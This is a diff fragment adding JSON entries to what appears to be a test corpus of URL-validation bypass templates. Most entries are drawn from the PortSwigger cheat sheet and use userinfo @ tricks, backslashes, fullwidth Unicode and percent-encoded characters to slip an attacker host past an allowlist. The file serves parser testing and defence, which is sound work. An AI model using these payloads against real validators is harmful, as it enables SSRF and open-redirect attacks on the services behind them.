+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME &@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP} &@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-semicolon-full-url",
+      "name": "Semicolon then a second full URL",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME;https://ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP};{S}://{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-attacker-colon-backslash-atat-allowed",
+      "name": "Attacker, colon-backslash-@@, allowed",
+      "family": "backslash",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME:\\\\@@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}:\\@@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-query-equals-dot-allowed",
+      "name": "Query '?=.' then allowed",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME?=.ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}?=.{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-query-equals-allowed",
+      "name": "Query '?=' then allowed",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME?=ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}?={A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-query-allowed",
+      "name": "Query then allowed (no delimiter)",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME?ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}?{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-query-full-http-url-allowed",
+      "name": "Query containing a full http:// allowed URL",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME?http://ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}?http://{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-query-full-https-url-allowed",
+      "name": "Query containing a full https:// allowed URL",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME?https://ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}?https://{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-dotjoin-attacker-first-http",
+      "name": "Dot join, attacker first, http (contrast case)",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'http://ATTACKERHOSTNAME.ALLOWEDHOSTNAME/' - listed as a case that should NOT bypass; kept for empirical confirmation.",
+      "template": "http://{T}{TP}.{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-dotjoin-attacker-first-https",
+      "name": "Dot join, attacker first, https (contrast case)",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'https://ATTACKERHOSTNAME.ALLOWEDHOSTNAME/' - contrast case, should NOT bypass.",
+      "template": "{S}://{T}{TP}.{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-fullwidth-dot-attacker-first",
+      "name": "Fullwidth dot (U+FF0E), attacker first",
+      "family": "unicode",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME．ALLOWEDHOSTNAME/' (fullwidth dot).",
+      "template": "{S}://{T}{TP}．{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-double-at-attacker-first",
+      "name": "Double @, attacker first",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME@@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}@@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-simple-attacker-first",
+      "name": "Simple @, attacker first (first-@ probe)",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME@ALLOWEDHOSTNAME/' - probes whether a parser wrongly uses the FIRST @ instead of the last as the userinfo delimiter.",
+      "template": "{S}://{T}{TP}@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-query-param-d-allowed",
+      "name": "Query param 'd=' then allowed",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME/?d=ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}/{C}{P}?d={A}{AP}"
+    },
+    {
+      "id": "ps-attacker-dot-path-allowed",
+      "name": "Attacker host, allowed as dot-prefixed path",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME/.ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}/.{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-triple-slash-path-allowed",
+      "name": "Triple slash path then allowed",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME///ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}///{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-plain-path-allowed",
+      "name": "Allowed as plain path segment",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME/ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}/{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-backslash-dot-allowed",
+      "name": "Backslash-dot then allowed",
+      "family": "backslash",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME\\\\.ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}\\.{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-backslash-atat-allowed",
+      "name": "Backslash then double @, allowed",
+      "family": "backslash",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME\\\\@@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}\\@@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-backslash-allowed",
+      "name": "Single backslash then allowed",
+      "family": "backslash",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME\\\\ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}\\{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-backslash-anything-at-allowed",
+      "name": "Backslash + literal 'anything' + @ + allowed",
+      "family": "backslash",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME\\\\anything@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}\\anything@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-amp-at-allowed",
+      "name": "Ampersand then @ then allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME&@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}&@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-fullwidth-amp-allowed",
+      "name": "Fullwidth ampersand (U+FF06), no @",
+      "family": "unicode",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME＆ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}＆{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-small-amp-allowed",
+      "name": "Small form ampersand (U+FE60), no @",
+      "family": "unicode",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME﹠ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}﹠{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-hash-at-allowed",
+      "name": "Hash then @ then allowed",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME#@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}#@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-hash-backslash-at-allowed",
+      "name": "Hash then backslash-@ then allowed",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME#\\\\@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}#\\@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-hash-allowed-no-at",
+      "name": "Hash then allowed, no @ (fragment may swallow path)",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME#ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}#{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-percent-crlf-at-allowed",
+      "name": "Percent-encoded CRLF then @ then allowed",
+      "family": "whitespace",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME%0d%0a@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}%0d%0a@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-percent23-at-allowed",
+      "name": "Percent-encoded # then @ then allowed",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME%23@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}%23@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-percent2e-at-allowed",
+      "name": "Percent-encoded dot then @ then allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME%2e@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}%2e@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-percent2f-at-allowed",
+      "name": "Percent-encoded slash then @ then allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME%2f@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}%2f@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-percent3a443-dot-allowed",
+      "name": "Percent-encoded ':443' then dot then allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME%3a443.ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}%3a443.{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-percentff-allowed",
+      "name": "Percent %ff directly concatenated with allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME%ffALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}%ff{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-plus-at-allowed",
+      "name": "Plus then @ then allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME+@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}+@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-plus-amp-at-allowed",
+      "name": "Plus, ampersand, @, allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME+&@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}+&@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-foo-at-attacker-space-at-allowed",
+      "name": "Literal 'foo@' decoy, attacker, space, @, allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'foo@ATTACKERHOSTNAME @ALLOWEDHOSTNAME/'.",
+      "template": "{S}://foo@{T}{TP} @{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-foo-at-attacker-port-at-allowed",
+      "name": "Literal 'foo@' decoy, attacker, fake port 443, @, allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'foo@ATTACKERHOSTNAME:443@ALLOWEDHOSTNAME/'.",
+      "template": "{S}://foo@{T}{TP}:443@{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "zero-slash-userinfo",
+      "name": "Zero scheme slashes + userinfo @",
+      "family": "scheme-slashes",
+      "description": "Scheme colon directly followed by the authority (no slashes at all), combined with the userinfo @ trick. Inspired by the cheat sheet's bare 'http:ATTACKERHOSTNAME' / 'http:@ATTACKERHOSTNAME' entries.",
+      "template": "{S}:{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-slash-path-trick",
+      "name": "Backslash-slash in path (protocol-relative via backslash)",
+      "family": "scheme-slashes",
+      "description": "A path starting with backslash-then-slash: WHATWG normalizes the backslash to a slash, turning '/\\\\target' into '//target' - a scheme-relative authority reinterpretation. Inspired by the cheat sheet's bare path-trick entries ('/\\\\ATTACKERHOSTNAME').",
+      "template": "{S}://{A}{AP}/\\{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-slash-backslash-slash-path",
+      "name": "Backslash-slash-backslash-slash path",
+      "family": "scheme-slashes",
+      "description": "Alternating backslash/slash pairs before the target. Inspired by the cheat sheet's '\\\\/\\\\/ATTACKERHOSTNAME' entry.",
+      "template": "{S}://{A}{AP}\\/\\/{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-slash-path-single",
+      "name": "Backslash-slash path (single pair)",
+      "family": "scheme-slashes",
+      "description": "Inspired by the cheat sheet's '\\\\/ATTACKERHOSTNAME' entry.",
+      "template": "{S}://{A}{AP}\\/{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "double-bracket-sandwich",
+      "name": "Bracketed allowed sandwich before target",
+      "family": "ipv6-bracket",
+      "description": "Allowed host wrapped in [] (IPv6-literal syntax) twice before the real @-delimited target. Inspired by the cheat sheet's '[::1]@[::1]@ATTACKERHOSTNAME' entry.",
+      "template": "{S}://[{A}{AP}]@[{A}{AP}]@{T}{TP}/{C}{P}"
+    }
+  ]
+}
